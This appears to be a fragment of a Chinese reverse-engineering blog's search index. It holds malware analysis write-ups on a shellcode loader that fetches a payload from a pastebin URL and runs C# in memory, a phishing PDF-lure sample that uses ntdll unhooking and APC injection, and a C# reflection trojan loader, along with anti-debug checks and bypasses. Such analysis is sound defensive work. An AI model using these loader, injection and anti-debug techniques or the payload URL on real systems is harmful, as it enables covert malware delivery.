e3e9939056bce93976ac7628eb8d4f991812a4a41b03015b5fa3b332036965f80ce4b9e51290024fcda3ca8c10b1d16660d3ddb403fba40d58205c5ca80c","link":"/2020/08/27/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-8(x64-r3%E8%BF%9B%E5%85%A5r0)/"},{"title":"x64（学习笔记） - 9（x64 - r3进入r0）","text":"嗨，请准确无误地输入密码查看哟！ fa5d0ff48b3407361d3fdf2093e2198fef225b815d7266bb1882050a9f7fbd0354d333082715d0e31db571277e57326da5502234bc7d34336fce3f684830ea9f039cb68494865d0f1f76f1aa8ff01774c8a5941cfd20827ca48ba8acfed8486e66732722b1ebb88cf4804d9482f8b979a04843773f4834c21661b49adce874108c26a3656d9639496b86b8c8ca7df5ee6ae0da2507a7ac529be86011ac6a265754c738d7c46bbd553a49f2fe80ecd067da7f5bd9db1515a3674ab007b8a36561698176668560fdde30f4d80b7feec0c5ee9c89ceeb15c0cd05fbd1ef296615dccef6b602006fa0ddf63887c21bd8a343a2e3e2f527085af7c8058e767616007d4044b4bdb7543c4f6899cc541a15e25cd0de2a70d6344b270683006aafbbca21ae3d34020acc79b6785f63976d3cc069e0191ea3aafa7a0a1969ba258a922e637ce2864a1c9c7dbf74878afc7e83734286d77f4fc9a40f849499b96d5c4cfa217e863d80966e0747bebbaf2fb61be98b031ef660a59e8fd28146d2c1e73fcebf8ed8592f76cb845d7e688bf259d1fbad39494a111352fc6d5d487910ac792ac7dcd8cf6163804d77efb68cd688bddd4506777a5e903f53af85bd986aacc4a69b6bea3b9d7d78931aed7d69dbd8e97f712edb59a76104a48fb5de2b432da94ed208252aabd7df7ed3917a81b67515a2e2db3eb8adf21280240fab863014d92be60312f25f0f45887f55db16429e4f707de20bf9d4ff7e01101b754ffb2c84b8990f3d8531e3c3ac170c067d5325c4bafb9f4ff8be949b55ab694f5a514b602f48b2818dfe398bba39567bb92b545ccbfb2a0e63a6c998f38a601229757e3079b54c5db11e874f5f7c34935bc6c38bed4500c123dee6b253a2f101d8e33a203948c803e6c6a67bf80823dbf795744b8b677aca534fc74d80990d9dd616acc6255f0c8942ffbeead34f65929129998c3b584319096051a240b946dd707561855e70f77953c7ec8477bdb5ba071a774a88b3fef7f7f96bad56b04fa46583608d6a48d7a08dceaa761ac3241b49806a040b0526f21c453fea3b656a7173f53546d2b27e22364f413dd71b2ab058338fdd0d8cb78ccfa00ef583334baa0ee75c4cf203e2eb5b8e8716266aba9ea1dd68737d0114f9a45952bfbd93dc1340bc9f7eb01502b7ee291211074346823c4f16041f83fb43dbfbcd18449b16c780703c4792943de8b249bc6b18b4daac6d3e5f8f2f67595f87d773be23eb480025c827ee3f60e2550725f7fc877d9eef7a49a6aad8eb24ec85aa1917fb8699f82cb2cdf8936c8a98fecf91409ef6371ad3f0c8f55b04e55cfa8a7b8bce0238dd2a91aa5da0fd8f506bd80fa153cc3c111c3f1289744c6a56c00ab0a6bc9bf2bdd0b6083847b25cbfec22ea0079cab589ee2b34ea3fe47b0a626bdba309113baca0feb60fe82b865cbb9780a33f034a810e49f4981d929a9d7f00f7c42dcd80576489b0ace557eba643c461b677febc8b471c419b12790a3389f8a219f50e4dcca5c61148698c44a50d1ae797131c344863547a38eeb30aa248c38a3d4b587bf5fc2be64e23194e4547f7eef9355fbfd322814a78b2dfd4e16f334894eebb019b5cf1470995addc026e09efa845d29347e9347239759c2ed812d414e73e5301e2ddb079b1c2536defec725a67faf3f9c5c2a673f039dd793ec4daec158b2d146501633e7dccc47fd975f4e58a2607271485e9e40067536a0e3b8dba05d6ec7002d9d2191ca64153ec9e0b534065b0e01d04fc52af28b895021b94191faafc95ef7736c2752af5a369467e893b8544afe11a15fd18c68de5a5a35ebabea2f28382be7d93d025b87629107a53f22245a81cc8b8d1bcd337aa9a4ad75067826b08e352aabfc72f2533349d7f5714bafabfe56ab1c8c1e3517a9a490772ebfc66e3cf98f08668014eae31074a9598c8e057c7d9641969646f8abbd26311ebb9d40eeb116d879955939d5f4a588ae7896ad7c0da40000b24a522f748a5c7f2d5690444d689256f0c3e6c485b2e7678a9430302134d71d571cf349d1d18beac3a5d642e7bab9f86592b6dde0fc690209087c85df3c6141982ed3647e099a0174fcd4811aa46fa0a013f5fa5a476f517465c78c64097b440d31af7f013cdb7f38d7cef9aeef7898c0f626571d21b77718e3bf25f211b0a919b323d349326498910d534c0028e7d67c27a20c9089c323e58abc7271b1d73bbda330d056c0d6dcec4a4a0b572a8ba27b3fd","link":"/2020/08/27/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-9(x64-r3%E8%BF%9B%E5%85%A5r0)/"},{"title":"C内存加载C# 木马分析","text":"木马分析1.拖到查壳中 没有分析出来 2.直接用火绒剑看一下调用 C# 的系统dll 运行的时候 并没有发现有什么网络请求 3.直接拖IDA 发现IDA识别出来很多函数 看了一下字符串也没看到啥有用的 主函数一堆乱七八糟的 仔细看主函数 一堆乱七八杂的判断和 if，但是 在这里面 它肯定要调用函数，我只发现了一个调用点 进去分析发现了类似的代码结构（有点像llvm过的代码），它调用了InternetOpenA（导入表中有一些 winiNet http请求的函数）然后又jmp走了 winiNetHttp请求参考网址：https://my.oschina.net/allenwen/blog/685573 4.x32dbg动态调试 直接下断 InternetConnectA,HttpOpenRequestA 看一下它的请求 url: pastebin.com:443(0x1BB)/raw/nrSZnmgc Get Https(443) 返回值很像base64 base64解密之后 发现 开头就是 e9 0a 05 00 00 很像jmp (怀疑是shellcode) 动态调试下断点：InternetReadFile 函数返回结束的地方 因为返回值是base64加密，而且是shellcode，所以怀疑出去之后解密数据,解密完之后把shellcode贴到内存中 直接下memcpy，发现程序都运行起来了 它都没有copy… 所以只能慢慢跟 找到它贴shellcode的地方，然后下断点,动态跟踪 动态调试shellcode的时候发现了C加载C#的函数C内存运行C#dll-参考地址：www.cnblogs.com/flyDream12315/p/6062920.html LoadLibrary(“mscoree.dll”); LoadLibrary(“wininet.dll”); LoadLibrary(“oleaut32.dll”); 网络拉取shellcode base64解密 是个PE文件 esp+104 = PeDll CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&amp;pMetaHost); ICLRMetaHost: IUnknown： (pMetaHost)+0xC的位置 pMetaHost-&gt;GetRuntime(runtimeVersion, IID_ICLRRuntimeInfo, (VOID)&amp;pRuntimeInfo); ICLRRuntimeInfo: *(*pRuntimeInfo)+0x28的位置 pRuntimeInfo-&gt;IsLoadable(&amp;load); (pRuntimeInfo)+0x24的位置 pRuntimeInfo-&gt;GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (VOID)&amp;pRuntimeHost); ICorRuntimeHost: *(*pRuntimeHost)+0x28的位置 pRuntimeHost-&gt;Start() *(*pRuntimeHost)+0x34的位置 pRuntimeHost-&gt;GetDefaultDomain(&amp;pAppDomain) (pAppDomain) 第一个函数 pAppDomain-&gt;QueryInterface(IID__AppDomain, (VOID)&amp;pDefaultAppDomain); SAFEARRAY* pSafeArray = SafeArrayCreate(0x11,1,pData) SafeArrayCreate函数相关参考地址：https://blog.csdn.net/jisuanjixu/article/details/5959186 esp+0x110 单步进去发现是 SafeArrayAccessData(pSafeArray,&amp;pvData) 有一块循环赋值的地方，把PEdll的数据复制到了pvData中 又是一个call，单步直接进去是 SafeArrayUnaccessData(pSafeArray) esp+0x14 = pDefaultAppDomain,*(*pDefaultAppDomain)+0xB4 pDefaultAppDomain-&gt;Load_3(pSafeArray, &amp;pAssembly); 加载C#dll pAssembly(_Assembly) *(*pAssembly)+0x40 pAssembly-&gt;get_EntryPoint(&amp;pMethodInfo) 获取入口函数 [esp+12C] (verctorArg) = SafeArrayCreateVector(8,0,1) esi(verctor2) = SafeArrayCreateVector(0xC,0,1) 这个shellcode进来的时候有个参数，eax = SysAllocString(arg) SafeArrayPutElement(verctorArg,&amp;int(0),eax) SafeArrayPutElement(verctor2,&amp;int(0),一个变量) esp+C = pMethodInfo pMethodInfo-&gt;Invoke_3(obg,verctor2,&amp;retVal) 执行程序入口函数 mian 总结：全流程就是exe运行了一个shellcode shellcode中执行了C#的dll，所以主程序只是一个加载器而已，当获取到C# pedll的时候，其实就可以直接拉dnspy里面查看","link":"/2020/08/26/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/CSharp%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"},{"title":"E盾反调试分析","text":"GetStartupInfo 在程序启动后，会有一个StartupInfo的结构体变量，来保存程序启动的信息，我们通过其中参数的改变来检测程序是正常运行还是在调试器中运行的 参考地址：https://www.cnblogs.com/ziolo/p/3434815.html 参考地址：https://blog.csdn.net/tk86935367/article/details/8174368 E盾V51代码： 123456789101112BOOL UseGetStartupInfoCheckDebug(){ STARTUPINFO startUpInfo; startUpInfo.cb = sizeof(startUpInfo); GetStartupInfo(&amp;startUpInfo); if (startUpInfo.dwX != 0 || startUpInfo.dwY != 0 || startUpInfo.dwXCountChars != 0 || startUpInfo.dwYCountChars != 0 || startUpInfo.dwFillAttribute != 0 || startUpInfo.dwXSize != 0 || startUpInfo.dwYSize != 0 || (startUpInfo.dwFlags &amp; STARTF_FORCEOFFFEEDBACK)) { std::cout &lt;&lt; &quot;! GetStartupInfo debugger&quot; &lt;&lt; std::endl; return true; } return false;} 反反调试方案： Hook GetStartupInfo 返回一个 非0值 就好了 Hook GetStartupInfo 返回一个 非0值 就好了 IsDebuggerPresent 这个函数可以用在程序中，检测当前程序是否正在被调试，从而执行退出等行为，达到反调试的作用。 该函数通过 fs:[0x18] 获取 TEB -&gt; TEB:[0x30] 获取 PEB -&gt; PEB:[0x2] BeingDebugged:UChar 调试标志， 通过调试标志 来判断是否调试 参考资料：https://blog.csdn.net/chriz_w/article/details/52096552 参考资料：https://blog.csdn.net/ls1160/article/details/38105873 E盾V51代码： 123456789BOOL UseIsDebuggerPresentCheckDebug(){ if (IsDebuggerPresent()) { std::cout &lt;&lt; &quot;! IsDebuggerPresent debugger&quot; &lt;&lt; std::endl; return true; } return false;} 反反调试方案：hook函数直接返回false 心得 部分根据标志来判断反调试的，可以通过 直接使用汇编来写反调试 比如：IsDebuggerPresent","link":"/2021/07/10/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/E%E7%9B%BE%E5%8F%8D%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"},{"title":"post","text":"5.71 加密狗版","link":"/2020/10/18/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/E%E8%AF%AD%E8%A8%80%E7%B3%BB%E7%BB%9F%E6%A0%B8%E5%BF%83%E6%94%AF%E6%8C%81%E5%BA%93%E7%89%88%E6%9C%AC%E5%88%86%E6%9E%90/"},{"title":"pdf钓鱼样本分析","text":"观察样本 一个名为排班表的pdf图标的exe程序，很明显一个钓鱼程序 查壳 x64的 无壳 ida静态分析 第一块是一个清除ntdll上的hook的函数（这是我分析过重新命名的 映射ntdll 然后 覆盖了ntdll的text段，这段应该是他故意写了一个不正规的操作，导致IDA静态分析 分析错了属性 第二块就是一个获取了一些ntdll的函数 第三块是读取了一个资源文件 并且把文件放到了fileData中 第四块简单看了一下，是操作的就是filedata，直接猜测是对文件的解密操作 第五块就是创建了个映射内存 第六块 判断进程是不是system用户 第七快 如果是system用户 就使用svchost.exe来提权启动 如果不是就用explorer.exe来提权 第八块 不是system用户 利用explorer.exe来提权启动 跟第七块的代码是一样的 提权创建的新进程之后用把之前的filedata（shellcode）利用映射贴到启动的新进程中，然后插入APC来启动 第九块从资源文中拿到一个pdf文件 释放到当前目录下 然后打开了该文件","link":"/2020/08/26/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/pdf%E9%92%93%E9%B1%BC%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"},{"title":"一个藏在正常程序下的C#木马样本分析","text":"前言本文章只分析了木马加载的过程，不分析木马功能 背景护网期间一个朋友发给我的样本让我帮忙分析一下 分析过程 ExeinfoPe查了一下是一个C#的程序，然后加了个混淆直接de4dot处理一下拉入dnspy 反编译之后看没发现什么http请求，启动函数运行了一个frmMain窗体，看了看代码什么的发现是一个正常的窗体程序，什么也没发现 动态调试 程序肯定是有问题的，于是就动态调试发现，这个程序是一个加载程序，他找了一套正常程序的源码重写了一个属性的set函数 在set函数中，从资源文件拿到dll然后加载dll 利用反射加载dll之后 反射调用函数 Type type = assembly.GetTypes()[0]; MethodInfo method = type.GetMethod(“Click”); method.Invoke(0, parameters); 反射获取到第一个类，然后获取该类的Client函数，参数分别是 “OVAGp”,”bAJs”,”Finast” 直接dnspy动态调试 dump出来dll文件 dll也是C#的 然后加了混淆直接de4dot处理 然后拖入dnspy dnspy dll反编译 看着这样一个正常的程序，我们直接找一个Client的函数 一眼就是反射调用，不过他是通过vb.net的 dll是保存在资源图片中的 这个不用关注 我们直接把处理之后的的rawAssembly 给dump出来就好了 dump出来的dll还是一个C#的 是有复杂的混淆的 de4dot处理不了，我直接找画眉师傅给处理了一下然后拉到dnspy里面看了看 就是真实的木马样本。 总结此样本是一个加载器 首先从资源文件中拿到dll通过C#的反射加载起来，然后该dll再次从资源文件中拿到一个图片，从图片中提取出来功能dll，通过Microsoft.VisualBasic库的反射加载起来功能dll， 加载器和dll都是伪装成了正常的程序，如果不仔细看的时候 就可能以为是一个正常程序放过去了","link":"/2021/04/15/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E4%B8%80%E4%B8%AA%E8%97%8F%E5%9C%A8%E6%AD%A3%E5%B8%B8%E7%A8%8B%E5%BA%8F%E4%B8%8B%E7%9A%84CSharp%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"}],"tags":[],"categories":[{"name":"调试工具","slug":"调试工具","link":"/categories/%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"name":"vt","slug":"vt","link":"/categories/vt/"},{"name":"WinDbg","slug":"调试工具/WinDbg","link":"/categories/%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7/WinDbg/"},{"name":"内核分析逆向","slug":"内核分析逆向","link":"/categories/%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E9%80%86%E5%90%91/"},{"name":"常用代码笔记","slug":"常用代码笔记","link":"/categories/%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E7%AC%94%E8%AE%B0/"},{"name":"学习笔记","slug":"vt/学习笔记","link":"/categories/vt/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"vscode","slug":"vscode","link":"/categories/vscode/"},{"name":"驱动开发","slug":"驱动开发","link":"/categories/%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/"},{"name":"内核逆向分析中有趣的技巧","slug":"内核分析逆向/内核逆向分析中有趣的技巧","link":"/categories/%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E9%80%86%E5%90%91/%E5%86%85%E6%A0%B8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B8%AD%E6%9C%89%E8%B6%A3%E7%9A%84%E6%8A%80%E5%B7%A7/"},{"name":"木马分析","slug":"木马分析","link":"/categories/%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"},{"name":"获取系统版本号","slug":"常用代码笔记/获取系统版本号","link":"/categories/%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E7%AC%94%E8%AE%B0/%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E5%8F%B7/"},{"name":"快捷键","slug":"vscode/快捷键","link":"/categories/vscode/%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"name":"api","slug":"驱动开发/api","link":"/categories/%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/api/"},{"name":"保护模式","slug":"保护模式","link":"/categories/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"},{"name":"x64汇编","slug":"x64汇编","link":"/categories/x64%E6%B1%87%E7%BC%96/"},{"name":"x64","slug":"x64","link":"/categories/x64/"},{"name":"学习笔记","slug":"x64汇编/学习笔记","link":"/categories/x64%E6%B1%87%E7%BC%96/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"学习笔记","slug":"x64/学习笔记","link":"/categories/x64/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":".net木马","slug":"木马分析/net木马","link":"/categories/%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/net%E6%9C%A8%E9%A9%AC/"},{"name":"反调试","slug":"反调试","link":"/categories/%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"汇编","slug":"x64/汇编","link":"/categories/x64/%E6%B1%87%E7%BC%96/"},{"name":"保护模式","slug":"x64/保护模式","link":"/categories/x64/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"},{"name":"内核","slug":"x64/内核","link":"/categories/x64/%E5%86%85%E6%A0%B8/"},{"name":"E盾反调试分析","slug":"反调试/E盾反调试分析","link":"/categories/%E5%8F%8D%E8%B0%83%E8%AF%95/E%E7%9B%BE%E5%8F%8D%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"},{"name":"x64InlineHook","slug":"x64/x64InlineHook","link":"/categories/x64/x64InlineHook/"},{"name":"调用门","slug":"x64/保护模式/调用门","link":"/categories/x64/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/%E8%B0%83%E7%94%A8%E9%97%A8/"},{"name":"异常","slug":"x64/内核/异常","link":"/categories/x64/%E5%86%85%E6%A0%B8/%E5%BC%82%E5%B8%B8/"},{"name":"内存映射","slug":"x64/内核/内存映射","link":"/categories/x64/%E5%86%85%E6%A0%B8/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84/"},{"name":"漏洞隐藏注入","slug":"x64/内核/漏洞隐藏注入","link":"/categories/x64/%E5%86%85%E6%A0%B8/%E6%BC%8F%E6%B4%9E%E9%9A%90%E8%97%8F%E6%B3%A8%E5%85%A5/"},{"name":"r3进入r0","slug":"x64/内核/r3进入r0","link":"/categories/x64/%E5%86%85%E6%A0%B8/r3%E8%BF%9B%E5%85%A5r0/"},{"name":"x32","slug":"反调试/x32","link":"/categories/%E5%8F%8D%E8%B0%83%E8%AF%95/x32/"},{"name":"R3","slug":"反调试/R3","link":"/categories/%E5%8F%8D%E8%B0%83%E8%AF%95/R3/"}]}